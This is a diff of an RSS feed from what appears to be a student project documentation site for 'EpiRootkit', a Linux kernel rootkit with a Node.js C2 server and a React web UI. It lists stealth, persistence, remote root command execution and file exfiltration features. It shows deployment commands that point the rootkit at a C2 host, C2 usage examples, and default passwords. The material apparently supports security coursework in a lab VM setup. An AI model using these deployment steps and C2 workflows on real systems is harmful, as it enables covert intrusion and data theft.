@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 14:14:32 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 20:52:51 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -71,14 +71,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="acebfdTab" data-bs-toggle="tab" data-bs-target="#acebfd"
-		 type="button" role="tab" aria-controls="acebfd" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
+		 id="facbdeTab" data-bs-toggle="tab" data-bs-target="#facbde"
+		 type="button" role="tab" aria-controls="facbde" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="efabcdTab" data-bs-toggle="tab" data-bs-target="#efabcd"
-		 type="button" role="tab" aria-controls="efabcd" aria-selected="true">Build Disks Yourself&lt;/a>
+		 id="fcdabeTab" data-bs-toggle="tab" data-bs-target="#fcdabe"
+		 type="button" role="tab" aria-controls="fcdabe" aria-selected="true">Build Disks Yourself&lt;/a>
 
 		
 
@@ -95,7 +95,7 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="acebfd" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="facbde" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
 &lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
@@ -205,7 +205,7 @@ Or both VMs with:
 &lt;/ul>
 &lt;/li>
 &lt;li>
-&lt;p>When finished, close the QEMU window or use &lt;strong>Ctrl+C&lt;/strong> on the host script to shut down both VMs.&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="attacking-program-overview">Attacking Program Overview &lt;a href="#attacking-program-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Professional C2 (Command &amp;amp; Control) server for managing EpiRootkit connections.&lt;/p>
+&lt;p>When finished, close the QEMU window or use &lt;strong>Ctrl+C&lt;/strong> on the host script to shut down both VMs.&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="c2-server-overview">C2 Server Overview &lt;a href="#c2-server-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Professional Command &amp;amp; Control server for managing EpiRootkit connections.&lt;/p>
 &lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -232,18 +232,18 @@ pnpm start&lt;/code>
 &lt;li>C2 Server: &lt;code>4444&lt;/code>&lt;/li>
 &lt;li>Web Interface: &lt;code>3000&lt;/code>&lt;/li>
 &lt;/ul>
-&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="components">Components &lt;a href="#components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>CLI Interface&lt;/strong>: Vorpal.js interactive command system&lt;/li>
-&lt;li>&lt;strong>C2 Server&lt;/strong>: TCP server for rootkit connections (port 4444)&lt;/li>
-&lt;li>&lt;strong>Web Interface&lt;/strong>: Express.js + Socket.IO REST API (port 3000)&lt;/li>
+&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>CLI Interface&lt;/strong>: Interactive command system&lt;/li>
+&lt;li>&lt;strong>C2 Server&lt;/strong>: TCP server for rootkit connections&lt;/li>
+&lt;li>&lt;strong>Web Interface&lt;/strong>: REST API with Socket.IO&lt;/li>
 &lt;li>&lt;strong>Client Manager&lt;/strong>: Connection lifecycle and authentication&lt;/li>
-&lt;li>&lt;strong>Event System&lt;/strong>: Real-time logging and notifications&lt;/li>
+&lt;li>&lt;strong>Event System&lt;/strong>: Real-time logging&lt;/li>
 &lt;/ul>
 &lt;h3 id="technology-stack">Technology Stack &lt;a href="#technology-stack" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
 &lt;li>&lt;strong>Runtime&lt;/strong>: Node.js 18+ with pnpm&lt;/li>
 &lt;li>&lt;strong>CLI&lt;/strong>: Vorpal.js for commands&lt;/li>
 &lt;li>&lt;strong>Web&lt;/strong>: Express.js + Socket.IO&lt;/li>
-&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher (optional)&lt;/li>
+&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher with 32-byte hardcoded key (simple and reliable)&lt;/li>
 &lt;/ul>
 &lt;h2 id="core-features">Core Features &lt;a href="#core-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -457,12 +457,10 @@ pnpm install
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="db1898e" class="language-bash ">
+ &lt;pre id="e43335c" class="language-bash ">
  &lt;code>ls # List all connected clients
 # • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
-# • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM
-
-clients # Same as ls&lt;/code>
+# • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM&lt;/code>
  &lt;/pre>
  &lt;/div>
 &lt;h3 id="authentication">Authentication &lt;a href="#authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
@@ -489,7 +487,7 @@ auth Client-1 wrongpass # Wrong password
 # ERROR: Authentication failed&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Features:&lt;/strong>&lt;/p></description></item><item><title>Usage Guide</title><link>/docs/03-attacking-program/usage/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h1 id="usage-guide">Usage Guide &lt;a href="#usage-guide" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete workflows for the EpiRootkit C2 server.&lt;/p>
+&lt;p>&lt;strong>Security Features:&lt;/strong>&lt;/p></description></item><item><title>Usage Guide</title><link>/docs/03-attacking-program/usage/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h1 id="usage-guide">Usage Guide &lt;a href="#usage-guide" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete workflows for the EpiRootkit C2 server.&lt;/p>
 &lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-start-c2-server">1. Start C2 Server &lt;a href="#1-start-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
@@ -943,7 +941,7 @@ exec Client-1 whoami
 download Client-1 /huge/file.bin
 # ERROR: Network timeout&lt;/code>
  &lt;/pre>
- &lt;/div></description></item><item><title>Overview</title><link>/docs/04-web-ui/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/overview/</guid><description>&lt;h1 id="web-ui-overview">Web UI Overview &lt;a href="#web-ui-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Modern React-based web interface for EpiRootkit C2 server management.&lt;/p>
+ &lt;/div></description></item><item><title>Overview</title><link>/docs/04-web-ui/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/overview/</guid><description>&lt;h1 id="web-ui-overview">Web UI Overview &lt;a href="#web-ui-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Modern React-based web interface for EpiRootkit C2 management.&lt;/p>
 &lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard.png"
  alt="C2 Dashboard Main">
 &lt;/figure>
@@ -963,28 +961,71 @@ download Client-1 /huge/file.bin
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="b292da4" class="language-bash ">
- &lt;code># Start C2 server with Web UI
+ &lt;pre id="8734805" class="language-bash ">
+ &lt;code># Start system (includes Web UI)
 ./deploy_c2.sh
 
-# Access Web UI at http://localhost:3000
-# Default password is secret123&lt;/code>
+# Access Web UI
+# URL: http://localhost:3000
+# Password: password&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Technology stack and integration.&lt;/p>
+&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Frontend Technology Stack:&lt;/strong>&lt;/p>
 &lt;ul>
-&lt;li>&lt;strong>Frontend&lt;/strong>: React 18 + Vite&lt;/li>
-&lt;li>&lt;strong>Backend&lt;/strong>: Express.js + Socket.IO&lt;/li>
-&lt;li>&lt;strong>Authentication&lt;/strong>: JWT with session management&lt;/li>
-&lt;li>&lt;strong>Real-time&lt;/strong>: WebSocket connections&lt;/li>
-&lt;/ul></description></item><item><title>Installation &amp; Setup</title><link>/docs/04-web-ui/installation/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/installation/</guid><description>&lt;h1 id="installation--setup">Installation &amp;amp; Setup &lt;a href="#installation--setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>The Web UI is integrated with the C2 server and launches automatically.&lt;/p>
-&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>System requirements for running the Web UI.&lt;/p>
-&lt;ul>
-&lt;li>&lt;strong>Node.js&lt;/strong>: v18+&lt;/li>
-&lt;li>&lt;strong>pnpm&lt;/strong>: v8+ (recommended) or npm&lt;/li>
-&lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04+ or similar Linux distribution&lt;/li>
+&lt;li>&lt;strong>Framework&lt;/strong>: React 18 + Vite&lt;/li>
+&lt;li>&lt;strong>Styling&lt;/strong>: Tailwind CSS + shadcn/ui components&lt;/li>
+&lt;li>&lt;strong>State&lt;/strong>: React Context + hooks&lt;/li>
+&lt;li>&lt;strong>Real-time&lt;/strong>: WebSocket connections via Socket.IO&lt;/li>
+&lt;li>&lt;strong>Authentication&lt;/strong>: JWT tokens with session management&lt;/li>
 &lt;/ul>
-&lt;h2 id="installation">Installation &lt;a href="#installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Quick setup process.&lt;/p>
+&lt;h2 id="core-features">Core Features &lt;a href="#core-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Dashboard&lt;/strong>: Real-time client monitoring and statistics&lt;/li>
+&lt;li>&lt;strong>Authentication&lt;/strong>: Secure login with JWT tokens&lt;/li>
+&lt;li>&lt;strong>Client Management&lt;/strong>: Visual client cards with status indicators&lt;/li>
+&lt;li>&lt;strong>Interactive Panels&lt;/strong>: Terminal, file transfer, configuration, logs&lt;/li>
+&lt;li>&lt;strong>Real-time Updates&lt;/strong>: Live WebSocket synchronization&lt;/li>
+&lt;/ul>
+&lt;h2 id="user-interface">User Interface &lt;a href="#user-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="main-components">Main Components &lt;a href="#main-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Login Screen&lt;/strong>: JWT authentication&lt;/li>
+&lt;li>&lt;strong>Dashboard&lt;/strong>: Client overview with search and filtering&lt;/li>
+&lt;li>&lt;strong>Client Cards&lt;/strong>: Visual representation of connected rootkits&lt;/li>
+&lt;li>&lt;strong>Panel System&lt;/strong>: Tabbed interface for different operations&lt;/li>
+&lt;/ul>
+&lt;h3 id="panel-types">Panel Types &lt;a href="#panel-types" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Terminal Panel&lt;/strong>: Command execution interface&lt;/li>
+&lt;li>&lt;strong>Upload/Download Panel&lt;/strong>: File transfer with drag-drop&lt;/li>
+&lt;li>&lt;strong>Configuration Panel&lt;/strong>: Toggle rootkit settings&lt;/li>
+&lt;li>&lt;strong>Authentication Panel&lt;/strong>: Client authentication management&lt;/li>
+&lt;li>&lt;strong>Event Log Panel&lt;/strong>: Real-time activity monitoring&lt;/li>
+&lt;/ul>
+&lt;h2 id="integration">Integration &lt;a href="#integration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The Web UI integrates with the &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/overview/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Installation &amp; Setup</title><link>/docs/04-web-ui/installation/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/installation/</guid><description>&lt;h1 id="web-ui-installation">Web UI Installation &lt;a href="#web-ui-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>The Web UI is integrated with the C2 server and launches automatically.&lt;/p>
+&lt;h2 id="quick-setup">Quick Setup &lt;a href="#quick-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="ebfea24" class="language-bash ">
+ &lt;code># From project root
+./deploy_c2.sh&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>This starts both the C2 server and Web UI simultaneously.&lt;/p>
+&lt;h2 id="access">Access &lt;a href="#access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>URL&lt;/strong>: &lt;code>http://localhost:3000&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Default Password&lt;/strong>: &lt;code>password&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Features&lt;/strong>: All C2 functionality via web interface&lt;/li>
+&lt;/ul>
+&lt;h2 id="manual-installation">Manual Installation &lt;a href="#manual-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>If you need to install dependencies manually:&lt;/p>
 
 
 
@@ -1000,11 +1041,13 @@ download Client-1 /huge/file.bin
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="52acaba" class="language-bash ">
- &lt;code># On the root of the project
-./deploy_c2.sh&lt;/code>
+ &lt;pre id="388e366" class="language-bash ">
+ &lt;code>cd attacking_program
+pnpm install
+pnpm start&lt;/code>
  &lt;/pre>
- &lt;/div></description></item><item><title>Authentication</title><link>/docs/04-web-ui/features/authentication/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/authentication/</guid><description>&lt;h1 id="authentication">Authentication &lt;a href="#authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Secure login with JWT tokens and automatic session management.&lt;/p>
+ &lt;/div>
+&lt;p>For detailed configuration options, see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/installation/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Authentication</title><link>/docs/04-web-ui/features/authentication/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/authentication/</guid><description>&lt;h1 id="authentication">Authentication &lt;a href="#authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Secure login with JWT tokens and automatic session management.&lt;/p>
 &lt;figure class="img-fluid">&lt;img src="/images/webui/login.png"
  alt="Login Screen">
 &lt;/figure>
@@ -1015,7 +1058,7 @@ download Client-1 /huge/file.bin
 &lt;li>&lt;strong>Client Authentication&lt;/strong>: Authenticate individual rootkit clients&lt;/li>
 &lt;li>&lt;strong>Persistent Sessions&lt;/strong>: Survives browser refresh&lt;/li>
 &lt;/ul></description></item><item><title>Dashboard</title><link>/docs/04-web-ui/features/dashboard/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/dashboard/</guid><description>&lt;h1 id="dashboard">Dashboard &lt;a href="#dashboard" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Main interface for monitoring connected rootkit clients with real-time statistics.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard-overview.png"
+&lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard.png"
  alt="Dashboard Overview">
 &lt;/figure>
 
@@ -1026,10 +1069,6 @@ download Client-1 /huge/file.bin
 &lt;li>&lt;strong>Status Indicators&lt;/strong>: Color-coded connection states (Green/Yellow/Red)&lt;/li>
 &lt;li>&lt;strong>Quick Actions&lt;/strong>: One-click authentication and client management&lt;/li>
 &lt;/ul></description></item><item><title>Client Management</title><link>/docs/04-web-ui/features/client-management/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/client-management/</guid><description>&lt;h1 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Monitor and interact with connected rootkit clients in real-time.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/client-management.png"
- alt="Client Management">
-&lt;/figure>
-
 &lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>Connection Status&lt;/strong>: Visual indicators (Green/Yellow/Red) for client state&lt;/li>
 &lt;li>&lt;strong>Client Authentication&lt;/strong>: Secure password-based client authentication&lt;/li>
@@ -1070,10 +1109,6 @@ download Client-1 /huge/file.bin
 &lt;li>&lt;strong>Export Logs&lt;/strong>: Download events as JSON for analysis&lt;/li>
 &lt;li>&lt;strong>Color Coding&lt;/strong>: Visual event type identification&lt;/li>
 &lt;/ul></description></item><item><title>Upload/Download Panel</title><link>/docs/04-web-ui/features/panels/upload-download-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/upload-download-panel/</guid><description>&lt;h1 id="uploaddownload-panel">Upload/Download Panel &lt;a href="#uploaddownload-panel" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>File transfer interface with drag-and-drop upload and remote file browser.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/upload-download-panel.png"
- alt="Upload/Download Panel">
-&lt;/figure>
-
 &lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>Drag-and-Drop Upload&lt;/strong>: Large drop zone for easy file uploads&lt;/li>
 &lt;li>&lt;strong>Remote File Browser&lt;/strong>: Navigate and download from target filesystem&lt;/li>
@@ -1099,7 +1134,7 @@ download Client-1 /huge/file.bin
 &lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>Module Hiding&lt;/strong>: Toggle rootkit visibility in system&lt;/li>
 &lt;li>&lt;strong>Persistence&lt;/strong>: Configure boot survival mechanisms&lt;/li>
-&lt;li>&lt;strong>Communication Encryption&lt;/strong>: Secure C2 communication&lt;/li>
+&lt;li>&lt;strong>XOR Encryption&lt;/strong>: Simple 32-byte key encryption for C2 communication&lt;/li>
 &lt;li>&lt;strong>Real-time Updates&lt;/strong>: Changes applied immediately&lt;/li>
 &lt;li>&lt;strong>Status Indicators&lt;/strong>: Visual feedback for all settings&lt;/li>
 &lt;/ul></description></item><item><title>Authentication Panel</title><link>/docs/04-web-ui/features/panels/authentication-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/authentication-panel/</guid><description>&lt;h1 id="authentication-panel">Authentication Panel &lt;a href="#authentication-panel" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Secure two-layer authentication system for rootkit client access and control.&lt;/p>
@@ -1164,11 +1199,12 @@ download Client-1 /huge/file.bin
  &lt;/div>
 &lt;p>&lt;strong>Result&lt;/strong>: 5.4.0 provides modern kernel features without the security restrictions that complicate rootkit development.&lt;/p></description></item><item><title>EpiRootkit Overview</title><link>/docs/05-epirootkit/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/05-epirootkit/overview/</guid><description>&lt;h1 id="epirootkit">EpiRootkit &lt;a href="#epirootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).&lt;/p>
 &lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection with domain support&lt;/li>
+&lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection with domain support and XOR encryption&lt;/li>
 &lt;li>&lt;strong>DNS Resolution&lt;/strong>: Kernel-space domain name resolution&lt;/li>
 &lt;li>&lt;strong>Remote Commands&lt;/strong>: Execute shell commands with output capture&lt;/li>
 &lt;li>&lt;strong>File Transfer&lt;/strong>: Upload/download files between C2 and victim&lt;/li>
 &lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 password verification with rate limiting&lt;/li>
+&lt;li>&lt;strong>XOR Encryption&lt;/strong>: Simple, reliable 32-byte key encryption for all C2 traffic&lt;/li>
 &lt;li>&lt;strong>Stealth&lt;/strong>: Hide module from &lt;code>lsmod&lt;/code> and files from directory listings&lt;/li>
 &lt;li>&lt;strong>Persistence&lt;/strong>: Multiple mechanisms to survive reboots&lt;/li>
 &lt;/ul>
@@ -1187,15 +1223,15 @@ download Client-1 /huge/file.bin
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="6abc97f" class="language-bash ">
- &lt;code># 1. Build and deploy
+ &lt;pre id="d709c00" class="language-bash ">
+ &lt;code># 1. Build and deploy with XOR encryption enabled
 cd rootkit &amp;amp;&amp;amp; make
 sudo ./deploy_rootkit.sh address=c2.example.com port=443
 
 # 2. Start C2 server 
 cd attacking_program &amp;amp;&amp;amp; pnpm start
 
-# 3. Use rootkit
+# 3. Use rootkit (all communication XOR encrypted)
 auth Client-1 password
 # SUCCESS: Authentication successful
 
@@ -1204,12 +1240,44 @@ exec Client-1 whoami
 # Output: root
 
 status Client-1
-# EpiRootkit Status: Version 1.0.0, Module Hidden: YES&lt;/code>
+# EpiRootkit Status: Version 1.0.0, Module Hidden: YES, Encryption: XOR&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="network-layer">Network Layer &lt;a href="#network-layer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>Connection Management&lt;/strong>: Persistent TCP with auto-reconnect&lt;/li>
-&lt;li>&lt;strong>DNS Resolution&lt;/strong>: See &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/05-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/deployment/</guid><description>&lt;h1 id="build--deployment">Build &amp;amp; Deployment &lt;a href="#build--deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.&lt;/p>
+&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Network Layer&lt;/strong>: Connection management and DNS resolution&lt;/li>
+&lt;li>&lt;strong>Command System&lt;/strong>: Authentication and remote execution&lt;/li>
+&lt;li>&lt;strong>Stealth Features&lt;/strong>: Module and file hiding&lt;/li>
+&lt;li>&lt;strong>Persistence&lt;/strong>: Boot survival mechanisms&lt;/li>
+&lt;/ul>
+&lt;h3 id="communication-flow">Communication Flow &lt;a href="#communication-flow" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
